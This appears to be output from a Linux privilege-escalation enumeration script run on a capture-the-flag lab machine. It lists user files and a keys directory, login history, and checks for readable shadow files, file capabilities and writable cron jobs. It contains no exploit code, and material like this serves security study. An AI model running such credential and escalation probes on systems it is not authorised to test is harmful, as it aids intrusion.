+-rw-rw-r-- 1 bolt bolt 451626 Sep 27 10:22 /home/bolt/.cache/composer/files/phpunit/phpunit/9c50de50c4d2b29a6cedf7ddc036daa9c605026c.zip
+-rw-rw-r-- 1 bolt bolt 99617 Sep 27 10:21 /home/bolt/.cache/composer/files/symfony/twig-bridge/068bc6711aedcc0627c7071ebe7061c9e7b7d071.zip
+-rw-rw-r-- 1 bolt bolt 413739 Sep 27 10:20 /home/bolt/.cache/composer/files/symfony/security/c9c4dda768021ff2d86f343e8b0ea2795a29a4c5.zip
+-rw-rw-r-- 1 bolt bolt 208501 Sep 27 09:18 /home/bolt/.cache/composer/files/symfony/http-foundation/f18b424a464709c5d67702611eb0f6e31abfd357.zip
+-rw-rw-r-- 1 bolt bolt 24175 Sep 27 10:20 /home/bolt/.cache/composer/files/symfony/filesystem/d3525cdf4f040d75503a3549fb6921dce9b2002b.zip
+-rw-rw-r-- 1 bolt bolt 20326 Sep 27 10:21 /home/bolt/.cache/composer/files/symfony/asset/213e8d49cff2dde706898aa474897389a1b7ef7d.zip
+-rw-rw-r-- 1 bolt bolt 490647 Sep 27 10:21 /home/bolt/.cache/composer/files/symfony/validator/fdf17ef91ccd3b7303534e679661a91ececb0e58.zip
+-rw-rw-r-- 1 bolt bolt 28747 Sep 27 09:18 /home/bolt/.cache/composer/files/symfony/event-dispatcher/edc1f309fbf9cb96af4ab1e33fdd91cdaa04b374.zip
+-rw-rw-r-- 1 bolt bolt 97366 Sep 27 10:21 /home/bolt/.cache/composer/files/symfony/web-profiler-bundle/7f0e18cb4ea54e5b9004fcf1c7dfdb5d60cfab12.zip
+-rw-rw-r-- 1 bolt bolt 82574 Sep 27 10:22 /home/bolt/.cache/composer/files/symfony/css-selector/1ed385c64524a0003fc3cf96e56beb10922f2be5.zip
+-rw-rw-r-- 1 bolt bolt 19131 Sep 27 10:21 /home/bolt/.cache/composer/files/symfony/monolog-bridge/e93a7670c32e35d6f47b4c10f47ca11bb5d06c31.zip
+-rw-rw-r-- 1 bolt bolt 62084 Sep 27 09:18 /home/bolt/.cache/composer/files/symfony/yaml/a36dea2ab50b82615f0f9342ddd45d4bcd3d4117.zip
+-rw-rw-r-- 1 bolt bolt 94406 Sep 27 09:19 /home/bolt/.cache/composer/files/symfony/security-acl/94571fc4757b0bf00eb11e68a5e63097537939a5.zip
+-rw-rw-r-- 1 bolt bolt 516330 Sep 27 10:21 /home/bolt/.cache/composer/files/symfony/form/0e493c93c6758ca0a59c29fa9497fb507b847c8d.zip
+-rw-rw-r-- 1 bolt bolt 136626 Sep 27 09:18 /home/bolt/.cache/composer/files/symfony/translation/4dffd404ec3502cba4a5632bfc6603247a20fe4d.zip
+-rw-rw-r-- 1 bolt bolt 5124 Sep 27 09:18 /home/bolt/.cache/composer/files/symfony/polyfill-php55/7899aaa5266dbc61b96884fa31ed70994b28abe0.zip
+-rw-rw-r-- 1 bolt bolt 147612 Sep 27 09:18 /home/bolt/.cache/composer/files/symfony/routing/185039e425823015897ba091d5bcbb8b5197c9e5.zip
+-rw-rw-r-- 1 bolt bolt 50561 Sep 27 09:18 /home/bolt/.cache/composer/files/symfony/phpunit-bridge/68f85a10a0b833cf90050419f9d23c4c78ed2424.zip
+-rw-rw-r-- 1 bolt bolt 6139 Sep 27 09:18 /home/bolt/.cache/composer/files/symfony/polyfill-php54/6636915569b9147a544dc18e7bf5aaee22daf28a.zip
+-rw-rw-r-- 1 bolt bolt 21443 Sep 27 09:18 /home/bolt/.cache/composer/files/symfony/requirements-checker/9a1619abdc0ebc85649fe243a09e7ae5ea846f47.zip
+-rw-rw-r-- 1 bolt bolt 3980 Sep 27 09:18 /home/bolt/.cache/composer/files/symfony/polyfill-ctype/bb6fedbb90ff21eee20a7310c78dd982da50c2c5.zip
+-rw-rw-r-- 1 bolt bolt 22716 Sep 27 09:18 /home/bolt/.cache/composer/files/symfony/polyfill-mbstring/98ce385eb92dc853d1edd64de3aa25b679332a96.zip
+-rw-rw-r-- 1 bolt bolt 2731 Sep 27 10:21 /home/bolt/.cache/composer/files/symfony/polyfill-intl-icu/1b098c9b03bb04a9115f6225e462caa7c13314fa.zip
+-rw-rw-r-- 1 bolt bolt 2414112 Sep 27 10:21 /home/bolt/.cache/composer/files/symfony/intl/89be5ce832bb9bb726aae2e6700266c76b8d4a86.zip
+-rw-rw-r-- 1 bolt bolt 45751 Sep 27 10:20 /home/bolt/.cache/composer/files/symfony/process/9842c7ddfbdc5832726d4a302f33d95a36fcfaad.zip
+-rw-rw-r-- 1 bolt bolt 25604 Sep 27 10:22 /home/bolt/.cache/composer/files/symfony/browser-kit/1cdf4adb23fa24fda036f54d6a9bdf4f27993869.zip
+-rw-rw-r-- 1 bolt bolt 25866 Sep 27 10:21 /home/bolt/.cache/composer/files/symfony/options-resolver/d8cf91efe929fddc3cae2ba632457a3a9755ce04.zip
+-rw-rw-r-- 1 bolt bolt 4329 Sep 27 09:19 /home/bolt/.cache/composer/files/symfony/polyfill-php56/8cf7bc249bf835d51f12e8840205f7becbb8e819.zip
+-rw-rw-r-- 1 bolt bolt 8721 Sep 27 09:19 /home/bolt/.cache/composer/files/symfony/polyfill-util/d5acec672a8431b82f6bdc45e2ce020b4f898866.zip
+-rw-rw-r-- 1 bolt bolt 117503 Sep 27 10:21 /home/bolt/.cache/composer/files/symfony/config/f12771977555523e77fe68e213ef61aa963f1565.zip
+-rw-rw-r-- 1 bolt bolt 6469 Sep 27 09:18 /home/bolt/.cache/composer/files/symfony/polyfill-php70/444104a376802b0067206c576fee28702800a26a.zip
+-rw-rw-r-- 1 bolt bolt 87571 Sep 27 09:18 /home/bolt/.cache/composer/files/symfony/finder/8c4f2ca62185589b024ee149259137f0348ad519.zip
+-rw-rw-r-- 1 bolt bolt 60305 Sep 27 10:22 /home/bolt/.cache/composer/files/symfony/dom-crawler/5fb264de34787609efa9f1fbbb0bc9667221298a.zip
+-rw-rw-r-- 1 bolt bolt 272337 Sep 27 09:19 /home/bolt/.cache/composer/files/symfony/http-kernel/3b0127b78e7bdcb57e478512fb5f7fce057ae8b6.zip
+-rw-rw-r-- 1 bolt bolt 9900 Sep 27 10:21 /home/bolt/.cache/composer/files/symfony/stopwatch/de2d608dda0b00c063106a0ef21c8cad3be49b5b.zip
+-rw-rw-r-- 1 bolt bolt 65043 Sep 27 09:18 /home/bolt/.cache/composer/files/symfony/debug/7efe145fdee603bf2b3502ef36db0ce7dbac6bc9.zip
+-rw-rw-r-- 1 bolt bolt 72256 Sep 27 10:21 /home/bolt/.cache/composer/files/symfony/var-dumper/ae40af61434ad18a903754736e19b2197b2d5141.zip
+-rw-rw-r-- 1 bolt bolt 2992 Sep 27 09:18 /home/bolt/.cache/composer/files/symfony/polyfill-php71/176d2986f624cfd0a8a2670c3c5a49ed5f1cbb23.zip
+-rw-rw-r-- 1 bolt bolt 273970 Sep 27 10:21 /home/bolt/.cache/composer/files/symfony/console/237fdfbdb03854b60f57de61a5fb5a897200037c.zip
+-rw-rw-r-- 1 bolt bolt 47277 Sep 27 09:19 /home/bolt/.cache/composer/files/symfony/property-access/0f5b42cf6dbf487783321a7b5036db9f0bb30c60.zip
+-rw-rw-r-- 1 bolt bolt 60760 Sep 27 10:21 /home/bolt/.cache/composer/files/justinrainbow/json-schema/51fe0c07a26490dc2611d1a6df2f38167b6a26aa.zip
+-rw-rw-r-- 1 bolt bolt 19877 Sep 27 09:18 /home/bolt/.cache/composer/files/contao/imagine-svg/62187d0ca2e8478504f845b57b67cb958974a0a0.zip
+-rw-rw-r-- 1 bolt bolt 177764 Sep 27 10:20 /home/bolt/.cache/composer/files/brandonwamboldt/utilphp/218c80ac4e64a66f6978f6efb8bb74e641343cf4.zip
+-rw-rw-r-- 1 bolt bolt 13 Sep 27 09:17 /home/bolt/.cache/composer/.htaccess
+-rw-rw-r-- 1 bolt bolt 73 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/description
+-rw-rw-r-- 1 bolt bolt 1516 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/packed-refs
+-r--r--r-- 1 bolt bolt 9948 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/objects/pack/pack-c679925500cef922bc750b89fc379a7d37ad3beb.idx
+-r--r--r-- 1 bolt bolt 74827 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/objects/pack/pack-c679925500cef922bc750b89fc379a7d37ad3beb.pack
+-rw-rw-r-- 1 bolt bolt 240 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/info/exclude
+-rw-rw-r-- 1 bolt bolt 23 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/HEAD
+-rw-rw-r-- 1 bolt bolt 170 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/config
+-rwxrwxr-x 1 bolt bolt 3610 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/hooks/update.sample
+-rwxrwxr-x 1 bolt bolt 478 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/hooks/applypatch-msg.sample
+-rwxrwxr-x 1 bolt bolt 189 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/hooks/post-update.sample
+-rwxrwxr-x 1 bolt bolt 3327 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/hooks/fsmonitor-watchman.sample
+-rwxrwxr-x 1 bolt bolt 1348 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/hooks/pre-push.sample
+-rwxrwxr-x 1 bolt bolt 424 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/hooks/pre-applypatch.sample
+-rwxrwxr-x 1 bolt bolt 896 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/hooks/commit-msg.sample
+-rwxrwxr-x 1 bolt bolt 4898 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/hooks/pre-rebase.sample
+-rwxrwxr-x 1 bolt bolt 544 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/hooks/pre-receive.sample
+-rwxrwxr-x 1 bolt bolt 1642 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/hooks/pre-commit.sample
+-rwxrwxr-x 1 bolt bolt 1492 Sep 27 09:19 /home/bolt/.cache/composer/vcs/https---github.com-bolt-codingstyle.git/hooks/prepare-commit-msg.sample
+-rw------- 1 bolt bolt 442 Nov  3 16:15 /home/bolt/keys/88132a62c6cf7fea78a7595169c1248b01346bbaf18ad70123a252f2e0108fa2
+-r-------- 1 bolt bolt 33 Sep 26 21:09 /home/bolt/user.txt
+-rw------- 1 bolt bolt 32 Nov  3 15:59 /home/bolt/.lesshst
+-rw------- 1 bolt bolt 155 Nov  3 16:15 /home/bolt/config
+-rw-rw-r-- 1 bolt bolt 13 Sep 27 09:17 /home/bolt/.local/share/composer/.htaccess
+-rwxr-xr-x 1 bolt bolt 6965760 Nov  3 16:32 /home/bolt/rest-server-0.9.7-linux-amd64
+-rw-r--r-- 1 bolt bolt 222 Nov  3 15:36 /home/bolt/.ssh/known_hosts
+[90m---[0;0m
+[97m[[94mi[97m] [90mfst510[97m SSH files anywhere[90m..............................................[34m yes![0;0m
+[90m---[0;0m
+-rw-r--r-- 1 bolt bolt 222 Nov  3 15:36 /home/bolt/.ssh/known_hosts
+-rw-r--r-- 1 root root 743 Oct 17 09:54 /home/bolt/.ssh/authorized_keys
+[90m---[0;0m
+[97m[[94mi[97m] [90mfst520[97m Check hosts.equiv file and its contents[90m.........................[90m nope[0;0m
+[97m[[94mi[97m] [90mfst530[97m List NFS server shares[90m..........................................[90m nope[0;0m
+[97m[[94mi[97m] [90mfst540[97m Dump fstab file[90m.................................................[34m yes![0;0m
+[90m---[0;0m
+# /etc/fstab: static file system information.
+#
+# Use 'blkid' to print the universally unique identifier for a
+# device; this may be used with UUID= as a more robust way to name devices
+# that works even if disks are added and removed. See fstab(5).
+#
+# <file system> <mount point>   <type>  <options>       <dump>  <pass>
+/dev/mapper/vagrant--vg-root /               ext4    errors=remount-ro 0       1
+/dev/mapper/vagrant--vg-swap_1 none            swap    sw              0       0
+[90m---[0;0m
+[35m=================================================================([32m system [35m)=====[0;0m
+[97m[[94mi[97m] [90msys000[97m Who is logged in[90m................................................[34m yes![0;0m
+[90m---[0;0m
+ 16:35:16 up  1:16,  7 users,  load average: 0.93, 0.50, 0.22
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+bolt     pts/0    10.10.14.171     15:19    2:20   0.11s  0.11s -bash
+bolt     pts/1    10.10.16.23      15:20   18:12   0.07s  0.07s -bash
+bolt     pts/2    10.10.14.215     15:25   28.00s  0.11s  0.00s w
+bolt     pts/3    10.10.14.236     15:36    6:28   0.54s  0.54s -bash
+bolt     pts/4    10.10.15.164     15:43   38:36   1:34   1:34  ./bash
+bolt     pts/6    10.10.15.164     15:54   44.00s  0.18s  0.18s -bash
+bolt     pts/7    10.10.14.206     15:54   12.00s  0.14s  0.00s ./rest-server-0.9.7-linux-amd64
+[90m---[0;0m
+[97m[[94mi[97m] [90msys010[97m Last logged in users[90m............................................[34m yes![0;0m
+[90m---[0;0m
+bolt     pts/7        10.10.14.206     Sun Nov  3 15:54   still logged in
+bolt     pts/6        10.10.15.164     Sun Nov  3 15:54   still logged in
+bolt     pts/5        10.10.15.82      Sun Nov  3 15:43 - 16:08  (00:24)
+bolt     pts/4        10.10.15.164     Sun Nov  3 15:43   still logged in
+root     pts/4        10.10.15.250     Sun Nov  3 15:37 - 15:39  (00:02)
+bolt     pts/3        10.10.14.236     Sun Nov  3 15:36   still logged in
+bolt     pts/2        10.10.14.215     Sun Nov  3 15:25   still logged in
+bolt     pts/1        10.10.16.23      Sun Nov  3 15:20   still logged in
+bolt     pts/0        10.10.14.171     Sun Nov  3 15:19   still logged in
+reboot   system boot  4.15.0-65-generi Sun Nov  3 15:18   still running
+bolt     pts/2        10.10.14.2       Mon Oct 21 10:31 - 10:45  (00:13)
+bolt     pts/2        10.10.14.2       Mon Oct 21 10:30 - 10:31  (00:01)
+root     tty1                          Mon Oct 21 09:53 - down   (00:56)
+root     pts/1        10.10.14.2       Mon Oct 21 09:08 - down   (01:42)
+bolt     pts/0        10.10.14.2       Mon Oct 21 09:04 - 10:41  (01:37)
+bolt     tty1                          Mon Oct 21 08:56 - 09:05  (00:09)
+reboot   system boot  4.15.0-65-generi Mon Oct 21 08:52 - 10:50  (01:57)
+root     tty1                          Mon Oct 21 08:49 - down   (00:01)
+reboot   system boot  4.15.0-65-generi Mon Oct 21 08:49 - 08:51  (00:02)
+root     tty1                          Mon Oct 21 08:26 - down   (00:22)
+reboot   system boot  4.15.0-29-generi Mon Oct 21 08:26 - 08:49  (00:22)
+bolt     pts/2        10.10.14.2       Thu Oct 17 14:45 - 14:53  (00:07)
+bolt     pts/1        10.10.14.2       Thu Oct 17 14:26 - 14:53  (00:26)
+root     pts/0        10.10.14.2       Thu Oct 17 14:24 - 14:53  (00:29)
+reboot   system boot  4.15.0-29-generi Thu Oct 17 14:24 - 19:25  (05:01)
+bolt     pts/3        10.10.14.2       Thu Oct 17 14:11 - 14:11  (00:00)
+root     pts/2        10.10.14.2       Thu Oct 17 14:09 - down   (00:14)
+root     pts/2        10.10.14.2       Thu Oct 17 10:36 - 10:36  (00:00)
+bolt     pts/1        10.10.14.2       Thu Oct 17 10:25 - 14:24  (03:58)
+root     pts/1        10.10.14.2       Thu Oct 17 09:58 - 09:59  (00:00)
+root     pts/1        10.10.14.2       Thu Oct 17 09:58 - 09:58  (00:00)
+bolt     pts/1        10.10.14.2       Thu Oct 17 09:54 - 09:54  (00:00)
+bolt     pts/1        10.10.14.2       Thu Oct 17 09:54 - 09:54  (00:00)
+bolt     pts/0        10.10.14.2       Thu Oct 17 09:25 - 14:24  (04:58)
+reboot   system boot  4.15.0-29-generi Thu Oct 17 09:23 - 14:24  (05:00)
+root     tty1                          Fri Oct 11 09:34 - down   (00:00)
+reboot   system boot  4.15.0-29-generi Fri Oct 11 09:33 - 09:34  (00:00)
+reboot   system boot  4.15.0-29-generi Thu Oct 10 09:03 - 09:34 (1+00:30)
+root     tty1                          Thu Oct 10 08:57 - down   (00:06)
+reboot   system boot  4.15.0-29-generi Thu Oct 10 08:55 - 09:03  (00:08)
+reboot   system boot  4.15.0-29-generi Wed Oct  9 23:58 - 09:03  (09:05)
+reboot   system boot  4.15.0-29-generi Wed Oct  9 22:38 - 09:03  (10:25)
+root     pts/2        192.168.1.52     Tue Oct  8 21:38 - crash (1+00:59)
+root     pts/2        192.168.1.52     Tue Oct  8 21:21 - 21:38  (00:16)
+root     pts/1        192.168.1.52     Tue Oct  8 21:14 - crash (1+01:23)
+root     pts/1        192.168.1.52     Tue Oct  8 20:28 - 21:14  (00:45)
+bolt     pts/0        192.168.1.52     Tue Oct  8 20:28 - crash (1+02:09)
+reboot   system boot  4.15.0-29-generi Tue Oct  8 20:27 - 09:03 (1+12:36)
+reboot   system boot  4.15.0-29-generi Tue Oct  8 20:26 - 09:03 (1+12:37)
+reboot   system boot  4.15.0-29-generi Tue Oct  8 20:25 - 09:03 (1+12:38)
+reboot   system boot  4.15.0-29-generi Tue Oct  8 20:23 - 09:03 (1+12:40)
+bolt     pts/1        192.168.50.1     Fri Sep 27 10:37 - 10:42  (00:04)
+bolt     pts/1        192.168.50.1     Fri Sep 27 08:39 - 10:37  (01:58)
+root     pts/0        192.168.50.1     Fri Sep 27 08:38 - 10:42  (02:03)
+bolt     pts/0        192.168.50.1     Fri Sep 27 08:32 - 08:38  (00:06)
+root     pts/0        192.168.50.1     Fri Sep 27 08:32 - 08:32  (00:00)
+reboot   system boot  4.15.0-29-generi Fri Sep 27 08:27 - 10:43  (02:15)
+bolt     pts/0        192.168.50.1     Thu Sep 26 23:40 - 23:40  (00:00)
+root     pts/0        192.168.50.1     Thu Sep 26 23:39 - 23:40  (00:00)
+root     pts/0        192.168.50.1     Thu Sep 26 23:39 - 23:39  (00:00)
+root     pts/0        192.168.50.1     Thu Sep 26 23:38 - 23:39  (00:00)
+root     pts/0        192.168.50.1     Thu Sep 26 23:37 - 23:38  (00:01)
+root     pts/0        192.168.50.1     Thu Sep 26 23:35 - 23:37  (00:01)
+bolt     pts/0        192.168.50.1     Thu Sep 26 23:35 - 23:35  (00:00)
+root     pts/1        192.168.50.1     Thu Sep 26 23:34 - 23:35  (00:01)
+root     pts/1        192.168.50.1     Thu Sep 26 23:34 - 23:34  (00:00)
+root     pts/1        192.168.50.1     Thu Sep 26 22:45 - 23:34  (00:48)
+bolt     pts/0        192.168.50.1     Thu Sep 26 22:43 - 23:35  (00:51)
+reboot   system boot  4.15.0-29-generi Thu Sep 26 22:41 - 23:41  (00:59)
+bolt     pts/2        192.168.50.1     Thu Sep 26 21:33 - 22:40  (01:07)
+root     pts/0        192.168.50.1     Thu Sep 26 21:06 - down   (01:34)
+reboot   system boot  4.15.0-29-generi Thu Sep 26 20:44 - 22:40  (01:56)
+root     pts/0        192.168.50.1     Tue Jul 30 22:19 - 22:19  (00:00)
+bolt     pts/1        192.168.50.1     Tue Jul 30 22:08 - 22:15  (00:06)
+root     pts/0        192.168.50.1     Tue Jul 30 21:40 - 22:19  (00:38)
+reboot   system boot  4.15.0-29-generi Tue Jul 30 21:40 - 22:19  (00:39)
+bolt     pts/0        192.168.50.1     Tue Jul 30 00:53 - 08:51  (07:57)
+reboot   system boot  4.15.0-29-generi Tue Jul 30 00:51 - 10:22  (09:30)
+bolt     pts/0        192.168.50.1     Tue Jul 30 00:37 - crash  (00:13)
+root     pts/0        192.168.50.1     Tue Jul 30 00:37 - 00:37  (00:00)
+bolt     pts/0        192.168.50.1     Tue Jul 30 00:32 - 00:37  (00:04)
+root     pts/0        192.168.50.1     Mon Jul 29 22:57 - 00:32  (01:34)
+reboot   system boot  4.15.0-29-generi Mon Jul 29 22:57 - 10:22  (11:24)
+root     pts/0        192.168.50.1     Thu May 30 13:58 - down   (00:15)
+root     pts/0        192.168.50.1     Thu May 30 13:55 - 13:56  (00:01)
+root     pts/0        192.168.50.1     Thu May 30 13:35 - 13:53  (00:17)
+bolt     pts/0        192.168.50.1     Thu May 30 12:46 - 13:35  (00:49)
+root     pts/0        192.168.50.1     Thu May 30 12:46 - 12:46  (00:00)
+bolt     pts/0        192.168.50.1     Thu May 30 12:46 - 12:46  (00:00)
+bolt     pts/0        192.168.50.1     Wed May 29 11:16 - 13:19  (02:03)
+root     pts/0        192.168.50.1     Wed May 29 11:15 - 11:16  (00:00)
+reboot   system boot  4.15.0-29-generi Wed May 29 11:15 - 14:13 (1+02:58)
+root     pts/0        192.168.50.1     Wed May 29 00:55 - 11:05  (10:10)
+bolt     pts/0        192.168.50.1     Wed May 29 00:03 - 00:46  (00:43)
+reboot   system boot  4.15.0-29-generi Tue May 28 21:32 - 11:06  (13:34)
+root     pts/0        192.168.50.1     Tue May 28 17:38 - 17:44  (00:05)
+reboot   system boot  4.15.0-29-generi Tue May 28 17:38 - 17:48  (00:09)
+root     pts/0        192.168.50.1     Tue May 28 17:37 - 17:37  (00:00)
+reboot   system boot  4.15.0-29-generi Tue May 28 17:35 - 17:37  (00:02)
+root     pts/0        192.168.50.1     Tue May 28 17:34 - 17:35  (00:00)
+reboot   system boot  4.15.0-29-generi Tue May 28 17:33 - 17:35  (00:02)
+root     pts/0        192.168.50.1     Tue May 28 17:28 - 17:32  (00:03)
+reboot   system boot  4.15.0-29-generi Tue May 28 17:28 - 17:32  (00:04)
+root     pts/0        192.168.50.1     Tue May 28 17:22 - 17:28  (00:05)
+reboot   system boot  4.15.0-29-generi Tue May 28 17:22 - 17:28  (00:06)
+bolt     pts/0        192.168.50.1     Tue May 28 17:21 - 17:21  (00:00)
+root     pts/0        192.168.50.1     Tue May 28 17:15 - 17:21  (00:05)
+bolt     pts/0        192.168.50.1     Tue May 28 17:15 - 17:15  (00:00)
+root     pts/0        192.168.50.1     Tue May 28 17:15 - 17:15  (00:00)
+root     pts/0        192.168.50.1     Tue May 28 17:15 - 17:15  (00:00)
+bolt     pts/0        192.168.50.1     Tue May 28 17:13 - 17:15  (00:01)
+root     pts/0        192.168.50.1     Tue May 28 17:13 - 17:13  (00:00)
+root     pts/0        192.168.50.1     Tue May 28 17:11 - 17:13  (00:01)
+root     pts/0        192.168.50.1     Tue May 28 17:11 - 17:11  (00:00)
+root     pts/0        192.168.50.1     Tue May 28 17:05 - 17:11  (00:05)
+reboot   system boot  4.15.0-29-generi Tue May 28 17:04 - 17:21  (00:17)
+root     pts/0        192.168.50.1     Tue May 28 17:01 - 17:03  (00:02)
+bolt     pts/0        192.168.50.1     Tue May 28 17:00 - 17:00  (00:00)
+root     pts/0        192.168.50.1     Tue May 28 16:59 - 17:00  (00:01)
+bolt     pts/0        192.168.50.1     Tue May 28 16:56 - 16:59  (00:02)
+reboot   system boot  4.15.0-29-generi Tue May 28 16:53 - 17:04  (00:10)
+bolt     pts/0        192.168.50.1     Mon May 27 15:56 - 15:58  (00:02)
+vagrant  pts/0        10.0.2.2         Mon May 27 15:51 - 15:56  (00:05)
+reboot   system boot  4.15.0-29-generi Mon May 27 15:50 - 15:58  (00:08)
+bolt     pts/1        192.168.50.1     Sun May 26 22:01 - 22:31  (00:30)
+vagrant  pts/0        10.0.2.2         Sat May 25 19:43 - 22:31 (1+02:47)
+bolt     pts/0        192.168.50.1     Sat May 25 17:10 - 19:43  (02:33)
+vagrant  pts/0        10.0.2.2         Sat May 25 15:56 - 17:10  (01:13)
+bolt     pts/1        192.168.50.1     Sat May 25 15:52 - 15:52  (00:00)
+bolt     pts/0        192.168.50.1     Sat May 25 15:44 - 15:56  (00:12)
+vagrant  pts/0        10.0.2.2         Sat May 25 15:34 - 15:44  (00:09)
+bolt     pts/0        192.168.50.1     Sat May 25 15:26 - 15:34  (00:08)
+bolt     pts/1        192.168.50.1     Fri May 24 22:24 - 22:24  (00:00)
+vagrant  pts/0        10.0.2.2         Fri May 24 15:45 - 15:25  (23:40)
+bolt     pts/0        192.168.50.1     Wed May 22 12:01 - 14:28 (1+02:26)
+vagrant  pts/0        10.0.2.2         Tue May 21 10:49 - 12:01 (1+01:11)
+bolt     pts/0        192.168.50.1     Tue May 21 10:28 - 10:49  (00:20)
+vagrant  pts/0        10.0.2.2         Tue May 21 10:28 - 10:28  (00:00)
+vagrant  pts/0        10.0.2.2         Tue May 21 10:25 - 10:28  (00:02)
+reboot   system boot  4.15.0-29-generi Tue May 21 08:24 - 15:48 (6+07:24)
+vagrant  pts/0        10.0.2.2         Mon May 20 00:15 - 05:11  (04:56)
+bolt     pts/1        192.168.50.1     Sat May 18 23:31 - 00:12 (1+00:41)
+vagrant  pts/1        10.0.2.2         Sat May 18 16:14 - 23:30  (07:16)
+vagrant  pts/0        10.0.2.2         Fri May 17 22:32 - 00:12 (2+01:40)
+reboot   system boot  4.15.0-29-generi Fri May 17 22:31 - 05:15 (2+06:43)
+reboot   system boot  4.15.0-29-generi Wed May 15 12:55 - 15:50 (1+02:54)
+vagrant  pts/0        10.0.2.2         Mon May  6 17:54 - crash (8+19:01)
+vagrant  pts/0        10.0.2.2         Mon May  6 17:49 - 17:54  (00:04)
+vagrant  pts/0        10.0.2.2         Mon May  6 17:44 - 17:48  (00:03)
+vagrant  pts/0        10.0.2.2         Mon May  6 17:41 - 17:44  (00:02)
+vagrant  pts/0        10.0.2.2         Mon May  6 17:39 - 17:41  (00:01)
+vagrant  pts/0        10.0.2.2         Mon May  6 17:33 - 17:38  (00:04)
+vagrant  pts/0        10.0.2.2         Mon May  6 17:29 - 17:30  (00:00)
+vagrant  pts/0        10.0.2.2         Mon May  6 17:26 - 17:28  (00:02)
+vagrant  pts/0        10.0.2.2         Mon May  6 17:19 - 17:22  (00:02)
+reboot   system boot  4.15.0-29-generi Mon May  6 17:18 - 15:50 (9+22:31)
+reboot   system boot  4.15.0-29-generi Mon May  6 17:17 - 17:18  (00:01)
+reboot   system boot  4.15.0-29-generi Mon May  6 14:05 - 17:16  (03:11)
+reboot   system boot  4.15.0-29-generi Fri Dec 28 19:07 - 19:24  (00:16)
+
+wtmp begins Fri Dec 28 19:07:49 2018
+[90m---[0;0m
+[97m[[91m![97m] [90msys020[97m Does the /etc/passwd have hashes?[90m...............................[90m nope[0;0m
+[97m[[91m![97m] [90msys030[97m Can we read /etc/shadow file?[90m...................................[90m nope[0;0m
+[97m[[91m![97m] [90msys030[97m Can we read /etc/shadow- file?[90m..................................[90m nope[0;0m
+[97m[[91m![97m] [90msys030[97m Can we read /etc/shadow~ file?[90m..................................[90m nope[0;0m
+[97m[[91m![97m] [90msys030[97m Can we read /etc/master.passwd file?[90m............................[90m nope[0;0m
+[97m[[93m*[97m] [90msys040[97m Check for other superuser accounts[90m..............................[90m nope[0;0m
+[97m[[93m*[97m] [90msys050[97m Can root user log in via SSH?[90m...................................[90m nope[0;0m
+[97m[[94mi[97m] [90msys060[97m List available shells[90m...........................................[34m yes![0;0m
+[90m---[0;0m
+# /etc/shells: valid login shells
+/bin/sh
+/bin/bash
+/bin/rbash
+/bin/dash
+/usr/bin/tmux
+/usr/bin/screen
+[90m---[0;0m
+[97m[[94mi[97m] [90msys070[97m System umask in /etc/login.defs[90m.................................[34m yes![0;0m
+[90m---[0;0m
+UMASK		022
+[90m---[0;0m
+[97m[[94mi[97m] [90msys080[97m System password policies in /etc/login.defs[90m.....................[34m yes![0;0m
+[90m---[0;0m
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+[90m---[0;0m
+[35m===============================================================([32m security [35m)=====[0;0m
+[97m[[93m*[97m] [90msec000[97m Is SELinux present?[90m.............................................[90m nope[0;0m
+[97m[[93m*[97m] [90msec010[97m List files with capabilities[90m....................................[36m yes![0;0m
+[90m---[0;0m
+/usr/bin/mtr-packet = cap_net_raw+ep
+[90m---[0;0m
+[97m[[91m![97m] [90msec020[97m Can we write to a binary with caps?[90m.............................[90m nope[0;0m
+[97m[[91m![97m] [90msec030[97m Do we have all caps in any binary?[90m..............................[90m nope[0;0m
+[97m[[93m*[97m] [90msec040[97m Users with associated capabilities[90m..............................[90m nope[0;0m
+[97m[[91m![97m] [90msec050[97m Does current user have capabilities?[90m............................ [90mskip
+[35m========================================================([32m recurrent tasks [35m)=====[0;0m
+[97m[[93m*[97m] [90mret000[97m User crontab[90m....................................................[90m nope[0;0m
+[97m[[91m![97m] [90mret010[97m Cron tasks writable by user[90m.....................................[90m nope[0;0m
+[97m[[93m*[97m] [90mret020[97m Cron jobs[90m.......................................................[36m yes![0;0m
+[90m---[0;0m
+/etc/crontab:SHELL=/bin/sh
+/etc/crontab:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+/etc/crontab:17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+/etc/crontab:25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+/etc/crontab:47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+/etc/crontab:52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
